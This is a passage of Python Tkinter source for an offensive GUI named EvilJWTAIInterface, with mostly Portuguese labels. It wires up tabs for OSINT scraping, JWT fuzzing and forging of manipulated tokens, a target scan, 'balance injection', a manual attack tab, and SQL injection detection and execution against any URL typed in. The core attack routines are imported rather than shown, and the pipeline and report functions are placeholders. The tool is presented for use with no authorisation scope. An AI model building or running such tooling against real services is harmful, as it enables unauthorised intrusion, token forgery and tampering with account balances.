        """Setup the Analyses tab with sub-tabs for OSINT, Token Analysis, Crypto Analysis, Wordlist Generation"""
        analysis_nb = ttk.Notebook(self.analysis_tab)
        analysis_nb.pack(fill=tk.BOTH, expand=True)
        # OSINT Scraper
        self.osint_tab = tk.Frame(analysis_nb, bg="#2d2d2d")
        analysis_nb.add(self.osint_tab, text="OSINT Scraper")
        self.setup_osint_scraper_tab()
        # Token Analysis
        self.token_analysis_tab = tk.Frame(analysis_nb, bg="#2d2d2d")
        analysis_nb.add(self.token_analysis_tab, text="Análise de Token")
        self.setup_token_analysis_tab()
        # Crypto Analysis
        self.crypto_tab = tk.Frame(analysis_nb, bg="#2d2d2d")
        analysis_nb.add(self.crypto_tab, text="Crypto Analysis")
        self.setup_crypto_tab()
        # Wordlist Generation
        self.wordlist_tab = tk.Frame(analysis_nb, bg="#2d2d2d")
        analysis_nb.add(self.wordlist_tab, text="Wordlist Generation")
        self.setup_wordlist_tab()
    
    def setup_attacks_tab(self):
        """Setup the Attacks tab with sub-tabs for various attack modules"""
        attacks_nb = ttk.Notebook(self.attacks_tab)
        attacks_nb.pack(fill=tk.BOTH, expand=True)
        # Target Scan
        self.target_scan_tab = tk.Frame(attacks_nb, bg="#2d2d2d")
        attacks_nb.add(self.target_scan_tab, text="Varredura de Alvo")
        self.setup_target_scan_tab()
        # Balance Injection
        self.balance_injection_tab = tk.Frame(attacks_nb, bg="#2d2d2d")
        attacks_nb.add(self.balance_injection_tab, text="Injeção de Saldo")
        self.setup_balance_injection_tab()
        # Manual Attack
        self.manual_attack_tab = tk.Frame(attacks_nb, bg="#2d2d2d")
        attacks_nb.add(self.manual_attack_tab, text="Ataque Manual")
        self.setup_manual_attack_tab()
        # Fuzzing JWT
        self.fuzz_tab = tk.Frame(attacks_nb, bg="#2d2d2d")
        attacks_nb.add(self.fuzz_tab, text="Fuzzing JWT")
        self.setup_fuzzing_tab()
        # SQL Injection
        self.sql_tab = tk.Frame(attacks_nb, bg="#2d2d2d")
        attacks_nb.add(self.sql_tab, text="SQL Injection")
        self.setup_sql_injection_tab()

    def setup_osint_scraper_tab(self):
        """Setup the OSINT Scraper panel"""
        # Input term
        term_frame = tk.Frame(self.osint_tab, bg="#2d2d2d")
        term_frame.pack(fill=tk.X, padx=10, pady=(10,0))
        tk.Label(term_frame, text="Termo de Busca:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.osint_entry = tk.Entry(term_frame, bg="#333333", fg="white")
        self.osint_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        # Run button
        btn = ttk.Button(self.osint_tab, text="Executar OSINT", command=self.run_osint)
        btn.pack(pady=10)
        # Output area
        self.osint_output = scrolledtext.ScrolledText(self.osint_tab, bg="#333333", fg="white", height=15)
        self.osint_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def run_osint(self):
        term = self.osint_entry.get().strip()
        if not term:
            messagebox.showerror("Erro", "Insira um termo para busca de OSINT.")
            return
        self.osint_output.delete(1.0, tk.END)
        threading.Thread(target=self._do_osint, args=(term,), daemon=True).start()

    def _do_osint(self, term):
        scraper = OSINTScraper()
        results = scraper.analyze_target(term)
        out = json.dumps(results, indent=2)
        self.osint_output.insert(tk.END, out)

    def setup_crypto_tab(self):
        """Setup the Crypto Analysis panel with advanced options"""
        # Input and operation frame
        frame = tk.LabelFrame(self.crypto_tab, text="Crypto Analysis", font=("Arial", 12, "bold"), fg="white", bg="#2d2d2d", bd=1)
        frame.pack(fill=tk.X, padx=10, pady=5)
        # Data input
        tk.Label(frame, text="Data:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT, padx=(5,0))
        self.crypto_input = tk.Entry(frame, bg="#333333", fg="white")
        self.crypto_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        # Operation selection
        ops = ["Encrypt AES", "Decrypt AES", "Hash SHA256", "Hash SHA512", "Hash MD5"]
        tk.Label(frame, text="Operation:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT, padx=(10,0))
        self.crypto_op = tk.StringVar(value=ops[0])
        ttk.Combobox(frame, values=ops, textvariable=self.crypto_op, width=15).pack(side=tk.LEFT, padx=(5,0))
        # Secret/Key entry
        key_frame = tk.Frame(self.crypto_tab, bg="#2d2d2d")
        key_frame.pack(fill=tk.X, padx=10, pady=(5,0))
        tk.Label(key_frame, text="Secret/Key:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.crypto_key_entry = tk.Entry(key_frame, bg="#333333", fg="white")
        self.crypto_key_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        # Mode selection for AES
        mode_frame = tk.Frame(self.crypto_tab, bg="#2d2d2d")
        mode_frame.pack(fill=tk.X, padx=10, pady=(5,0))
        tk.Label(mode_frame, text="Mode:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.crypto_mode = tk.StringVar(value="CBC")
        ttk.Combobox(mode_frame, values=list(MODES.keys()), textvariable=self.crypto_mode, width=10).pack(side=tk.LEFT, padx=(5,0))
        # IV input for decryption / display for encryption
        iv_frame = tk.Frame(self.crypto_tab, bg="#2d2d2d")
        iv_frame.pack(fill=tk.X, padx=10, pady=(5,0))
        tk.Label(iv_frame, text="IV (base64):", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.crypto_iv_entry = tk.Entry(iv_frame, bg="#333333", fg="white")
        self.crypto_iv_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        # Run button
        btn = tk.Button(self.crypto_tab, text="Executar Crypto", command=self.run_crypto, bg="#b00a0a", fg="white")
        btn.pack(pady=10)
        # Output
        self.crypto_output = scrolledtext.ScrolledText(self.crypto_tab, bg="#333333", fg="white", height=10)
        self.crypto_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0,10))

    def run_crypto(self):
        data = self.crypto_input.get().strip()
        op = self.crypto_op.get()
        key_input = self.crypto_key_entry.get().strip()
        mode = self.crypto_mode.get()
        iv_input = self.crypto_iv_entry.get().strip()
        if not data:
            messagebox.showerror("Erro", "Insira dados para análise criptográfica.")
            return
        # Validate key for AES operations
        if op in ("Encrypt AES", "Decrypt AES") and not key_input:
            messagebox.showerror("Erro", "Informe a chave secreta para AES.")
            return
        self.crypto_output.config(state=tk.NORMAL)
        self.crypto_output.delete(1.0, tk.END)
        try:
            if op == "Encrypt AES":
                # Derive key via SHA256 of secret
                key = sha256(key_input.encode()).digest()
                # Generate IV and encrypt
                result = encrypt_aes(data, key, iv=generate_iv(), mode=mode)
                ciphertext = result.get("ciphertext")
                iv_b64 = result.get("iv")
                out = f"Ciphertext: {ciphertext}\nIV: {iv_b64}"
            elif op == "Decrypt AES":
                # Derive key and decrypt with provided IV
                key = sha256(key_input.encode()).digest()
                if not iv_input:
                    messagebox.showerror("Erro", "Informe o IV em base64 para decriptação.")
                    return
                iv_bytes = base64.b64decode(iv_input)
                plaintext = decrypt_aes(data, key, iv=iv_bytes, mode=mode)
                out = f"Plaintext: {plaintext}"
            elif op.startswith("Hash"):
                if "SHA256" in op:
                    out = f"SHA256: {hash_sha256(data)}"
                elif "SHA512" in op:
                    out = f"SHA512: {hash_sha512(data)}"
                else:
                    out = f"MD5: {hash_md5(data)}"
            else:
                out = "Operação não suportada"
        except Exception as e:
            out = f"Erro: {e}"
        self.crypto_output.insert(tk.END, out)
        self.crypto_output.config(state=tk.DISABLED)

    def setup_wordlist_tab(self):
        """Setup the Wordlist Generation panel"""
        frame = tk.Frame(self.wordlist_tab, bg="#2d2d2d")
        frame.pack(fill=tk.X, padx=10, pady=5)
        tk.Label(frame, text="Base File:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.wordlist_file = tk.Entry(frame, bg="#333333", fg="white")
        self.wordlist_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        tk.Button(frame, text="Browse", command=lambda: self._browse_wordlist()).pack(side=tk.LEFT, padx=5)
        size_frame = tk.Frame(self.wordlist_tab, bg="#2d2d2d")
        size_frame.pack(fill=tk.X, padx=10, pady=(0,5))
        tk.Label(size_frame, text="Size:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.wordlist_size = tk.Entry(size_frame, bg="#333333", fg="white", width=5)
        self.wordlist_size.insert(0, "100")
        self.wordlist_size.pack(side=tk.LEFT, padx=(5,0))
        btn = ttk.Button(self.wordlist_tab, text="Generate Wordlist", command=self.run_wordlist)
        btn.pack(pady=5)
        self.wordlist_output = scrolledtext.ScrolledText(self.wordlist_tab, bg="#333333", fg="white", height=15)
        self.wordlist_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def _browse_wordlist(self):
        path = filedialog.askopenfilename()
        if path:
            self.wordlist_file.delete(0, tk.END)
            self.wordlist_file.insert(0, path)

    def run_wordlist(self):
        path = self.wordlist_file.get().strip() or None
        try:
            size = int(self.wordlist_size.get())
        except:
            size = 100
        self.wordlist_output.delete(1.0, tk.END)
        engine = WordlistEngine([] if not path else None)
        if path:
            with open(path) as f:
                engine.base_wordlist = [l.strip() for l in f]
        lst = engine.generate(size)
        self.wordlist_output.insert(tk.END, "\n".join(lst))

    def setup_fuzzing_tab(self):
        """Setup Fuzzing JWT panel"""
        frame = tk.Frame(self.fuzz_tab, bg="#2d2d2d")
        frame.pack(fill=tk.X, padx=10, pady=5)
        tk.Label(frame, text="Token:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.fuzz_token_entry = tk.Entry(frame, bg="#333333", fg="white")
        self.fuzz_token_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        tk.Label(frame, text="Endpoint:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT, padx=(10,0))
        self.fuzz_endpoint = tk.Entry(frame, bg="#333333", fg="white")
        self.fuzz_endpoint.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        btn = ttk.Button(self.fuzz_tab, text="Run Fuzzing", command=self.run_fuzzing)
        btn.pack(pady=5)
        self.fuzz_output = scrolledtext.ScrolledText(self.fuzz_tab, bg="#333333", fg="white", height=15)
        self.fuzz_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def run_fuzzing(self):
        token = self.fuzz_token_entry.get().strip()
        ep = self.fuzz_endpoint.get().strip()
        if not token or not ep:
            messagebox.showerror("Erro", "Informe token e endpoint.")
            return
        self.fuzz_output.delete(1.0, tk.END)
        threading.Thread(target=self._do_fuzz, args=(ep, [token]), daemon=True).start()

    def _do_fuzz(self, endpoint, tokens):
        results = advanced_fuzz_token(endpoint, tokens)
        self.fuzz_output.insert(tk.END, json.dumps(results, indent=2))

    def setup_sql_injection_tab(self):
        """Setup SQL Injection panel"""
        frame = tk.Frame(self.sql_tab, bg="#2d2d2d")
        frame.pack(fill=tk.X, padx=10, pady=5)
        tk.Label(frame, text="Target URL:", fg="white", bg="#2d2d2d").pack(side=tk.LEFT)
        self.sql_target = tk.Entry(frame, bg="#333333", fg="white")
        self.sql_target.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        btn1 = ttk.Button(self.sql_tab, text="Detectar Vulnerabilidades", command=self.detect_sql)
        btn1.pack(pady=(5,0))
        btn2 = ttk.Button(self.sql_tab, text="Run Injection", command=self.run_sql)
        btn2.pack(pady=(2,5))
        self.sql_output = scrolledtext.ScrolledText(self.sql_tab, bg="#333333", fg="white", height=15)
        self.sql_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def detect_sql(self):
        url = self.sql_target.get().strip()
        if not url:
            messagebox.showerror("Erro", "Informe URL alvo.")
            return
        self.sql_output.delete(1.0, tk.END)
        threading.Thread(target=self._do_detect_sql, args=(url,), daemon=True).start()

    def _do_detect_sql(self, url):
        inj = SQLInjector()
        vulns = inj.detect_vulnerable_fields(url)
        self.sql_output.insert(tk.END, json.dumps(vulns, indent=2))

    def run_sql(self):
        url = self.sql_target.get().strip()
        if not url:
            messagebox.showerror("Erro", "Informe URL alvo.")
            return
        self.sql_output.delete(1.0, tk.END)
        threading.Thread(target=self._do_run_sql, args=(url,), daemon=True).start()

    def _do_run_sql(self, url):
        inj = SQLInjector()
        campos = inj.analyze_endpoint(url)
        inj.smart_injection_attempts(url, campos)
        self.sql_output.insert(tk.END, json.dumps(inj.successful_injections, indent=2))

    def setup_pipeline_tab(self):
        """Setup the Pipeline orchestration panel"""
        frame = tk.Frame(self.pipeline_tab, bg="#2d2d2d")
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        label = ttk.Label(frame, text="Pipeline de Testes", font=("Arial", 12, "bold"), foreground="white", background="#2d2d2d")
        label.pack(pady=(0,10))
        steps = ["OSINT", "Varredura de Alvo", "Análise de Token", "Crypto Analysis", "Wordlist Generation", "Fuzzing JWT", "SQL Injection"]
        self.pipeline_vars = {}
        for step in steps:
            var = tk.BooleanVar(value=False)
            self.pipeline_vars[step] = var
            ttk.Checkbutton(frame, text=step, variable=var).pack(anchor="w", padx=20)
        btn = ttk.Button(frame, text="Executar Pipeline", command=self.run_pipeline)
        btn.pack(pady=10)
        self.pipeline_output = scrolledtext.ScrolledText(frame, bg="#333333", fg="white", height=15)
        self.pipeline_output.pack(fill=tk.BOTH, expand=True)

    def run_pipeline(self):
        self.pipeline_output.delete(1.0, tk.END)
        threading.Thread(target=self._do_pipeline, daemon=True).start()

    def _do_pipeline(self):
        import time
        sequence = ["OSINT", "Varredura de Alvo", "Análise de Token", "Crypto Analysis", "Wordlist Generation", "Fuzzing JWT", "SQL Injection"]
        for step in sequence:
            if self.pipeline_vars.get(step).get():
                self.pipeline_output.insert(tk.END, f"Executando {step}...\n")
                time.sleep(1)
                self.pipeline_output.insert(tk.END, f"{step} concluído.\n")
        self.pipeline_output.insert(tk.END, "Pipeline finalizado.\n")

    def setup_report_tab(self):
        """Setup the Reports tab"""
        self.report_frame = tk.Frame(self.report_tab, bg="#2d2d2d")
        self.report_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.report_text = scrolledtext.ScrolledText(self.report_frame, bg="#3c3c3c", fg="#ffffff")
        self.report_text.pack(fill=tk.BOTH, expand=True)
        gen_btn = ttk.Button(self.report_frame, text="Gerar Relatório", command=self.generate_report)
        gen_btn.pack(pady=10)

    def generate_report(self):
        """Generate report placeholder"""
        self.report_text.config(state=tk.NORMAL)
        self.report_text.delete(1.0, tk.END)
        self.report_text.insert(tk.END, "Relatório gerado com sucesso.\n")
        self.report_text.config(state=tk.DISABLED)

    # Add method to generate manipulated JWT tokens from UI inputs
    def generate_token_ui(self):
        """Generate manipulated JWT token from provided header, payload, and secret"""
        try:
            header = json.loads(self.header_text.get("1.0", tk.END))
            payload = json.loads(self.payload_text.get("1.0", tk.END))
        except json.JSONDecodeError as e:
            messagebox.showerror("Erro de JSON", f"Formato JSON inválido: {e}")
            return
        secret = self.secret_entry.get().strip()
        if not secret:
            messagebox.showerror("Erro", "Informe o Secret.")
            return
        token = generate_token(payload, secret)
        if token:
            self.generated_token_entry.delete(0, tk.END)
            self.generated_token_entry.insert(0, token)
        else:
            messagebox.showerror("Erro", "Falha ao gerar token.")


# Main entry point
if __name__ == "__main__":
    root = tk.Tk()
    app = EvilJWTAIInterface(root)
    root.mainloop() 